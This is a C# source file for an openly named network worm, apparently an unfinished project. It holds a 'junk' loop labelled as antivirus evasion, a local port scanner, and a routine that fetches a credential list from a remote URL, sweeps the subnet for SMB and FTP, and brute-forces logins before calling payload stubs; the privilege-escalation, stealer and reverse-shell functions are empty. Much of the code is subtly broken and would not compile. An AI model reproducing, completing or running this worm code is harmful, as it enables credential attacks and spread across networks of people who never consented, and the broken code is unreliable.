using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Management;

namespace Worm
{
    class Program
    {   
        static void privEsc()
        {

        }

        static void junk()
        {
            Random random = new Random();
            var stopTime = DateTime.Now.AddSeconds(30);

            while (DateTime.Now < stopTime)
            {
                Console.Write((char)random.Next(32, 128));
                Thread.Sleep(10);
            }
        }

        static void reverseShell()
        {

        }

        static void Stealer()
        {

        }

        static void ftp_Payload()
        {

        }

        static void smb_Payload()
        {

        }

        static void gatherInformation()
        {
            // Get the local IP address
            string localIP;
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 65530);
                IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                localIP = endPoint.Address.ToString();
            }

            // Get the open ports on the local machine
            var openPorts = new System.Collections.Generic.List<int>();
            for (int port = 1; port <= 65535; port++)
            {
                using (var client = new TcpClient())
                {
                    try
                    {
                        var result = client.BeginConnect(localIP, port, null, null);
                        var success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromMilliseconds(100));

                        if (!success)
                        {
                            continue;
                        }

                        client.EndConnect(result);
                        openPorts.Add(port);
                    }
                    catch
                    {
                        // Port is closed or blocked
                    }
                }
            }

            // Get the computer name
            string computerName = Environment.MachineName;

            // Get the operating system version
            string osVersion;
            using (var searcher = new ManagementObjectSearcher("SELECT Version FROM Win32_OperatingSystem"))
            {
                using (var results = searcher.Get())
                {
                    foreach (var result in results)
                    {
                        osVersion = result["Version"].ToString();
                    }
                }
            }

            // Print the information
            Console.WriteLine("Local IP: " + localIP);
            Console.WriteLine("Open Ports: " + string.Join(", ", openPorts));
            Console.WriteLine("Computer Name: " + computerName);
            Console.WriteLine("OS Version: " + osVersion);
        }

        static void SMBFTP()
        {
            // Get the IP address of the local machine
            string host = Dns.GetHostName();
            IPHostEntry ip = Dns.GetHostEntry(host);
            IPAddress localAddress = ip.AddressList[0];

            // Get the subnet mask of the local machine
            IPInterfaceProperties adapterProperties = NetworkInformation.GetIPProperties(localAddress);
            IPAddress mask = adapterProperties.UnicastAddresses[0].IPv4Mask;

            // Calculate the subnet address
            byte[] ipAdressBytes = localAddress.GetAddressBytes();
            byte[] subnetMaskBytes = mask.GetAddressBytes();
            byte[] subnetAddressBytes = new byte[ipAdressBytes.Length];
            for (int i = 0; i < subnetAddressBytes.Length; i++)
            {
                subnetAddressBytes[i] = (byte)(ipAdressBytes[i] & subnetMaskBytes[i]);
            }
            IPAddress subnetAddress = new IPAddress(subnetAddressBytes);

            // Download the credentials from the GitHub repository
            WebClient client = new WebClient();
            string credentials = client.DownloadString("https://raw.githubusercontent.com/<repo_name>/credentials.txt");
            string[] lines = credentials.Split('\n');
            List<Tuple<string, string>> credList = new List<Tuple<string, string>>();
            for (int i = 0; i < lines.Length; i+=2)
            {
                credList.Add(new Tuple<string, string>(lines[i], lines[i+1]));
            }

            // Scan all IP addresses in the subnet
            int portNumber;
            TcpClient client = new TcpClient();
            for (int i = 1; i < 255; i++)
            {
                // Check if SMB port (445) is open
                string remoteAddress = subnetAddress.ToString().Substring(0, subnetAddress.ToString().LastIndexOf('.') + 1) + i.ToString();
                try
                {
                    client.Connect(remoteAddress, 445);
                    Console.WriteLine(remoteAddress + " has open SMB port.");
                    foreach (var cred in credList)
                    {
                        try
                        {
                            NetworkCredential networkCredential = new NetworkCredential(cred[0], cred[1]);
                            using (var smbClient = new SmbClient(remoteAddress, networkCredential))
                            {
                                Console.WriteLine("Successfully connected to " + remoteAddress + " using " + cred[0] + "/" + cred[1]);
                                smb_Payload();
                            }
                            break;
                        }
                        catch (Exception)
                        {
                            Console.WriteLine("Failed to connect to " + remoteAddress + " using " + cred[0] + "/" + cred[1]);
                        }
                    }
                }
                catch (Exception)
                {
                    // Console.WriteLine(remoteAddress + " does not have open SMB port.");
                }

                // Check if FTP port (21) is open
                try
                {
                    client.Connect(remoteAddress, 21);
                    Console.WriteLine(remoteAddress + " has open FTP port.");
                    foreach (var cred in credList)
                    {
                        try
                        {
                            FtpWebRequest request = (FtpWebRequest)WebRequest.Create("ftp://" + remoteAddress);
                            request.Credentials = new NetworkCredential(cred[0], cred[1]);
                            request.Method = WebRequestMethods.Ftp.ListDirectory;

                            FtpWebResponse response = (FtpWebResponse)request.GetResponse();
                            Console.WriteLine("Connected to the FTP server successfully using credentials: " + cred[0] + "," + cred[1]);
                            response.Close();
                            ftp_Payload();
                            break;
                        }   
                        catch (WebException ex)
                        {
                            // Console.WriteLine("Failed to connect to the FTP server using credentials: " + cred[0] + "," + cred[1]);
                        }
                    }
                }
                catch (Exception)
                {
                    // Console.WriteLine(remoteAddress + " does not have open FTP port.");
                }
            }
            Console.ReadKey();
        }

        static void Main(string[] args)
        {
            // Init class
            Program worm = new Program();

            // junk code for 30 seconds and wait another 10 secs before executing the rest for basic AV Evasion
            worm.junk();

            // Priv Escalation
            worm.privEsc();

            // Gather Information about the current enviroment
            worm.gatherInformation();

            // Steal Information
            worm.Stealer(); 

            // Scan for new targets
            worm.SMBFTP();

            // Reverse Shell
            worm.reverseShell();
        }
    }
}
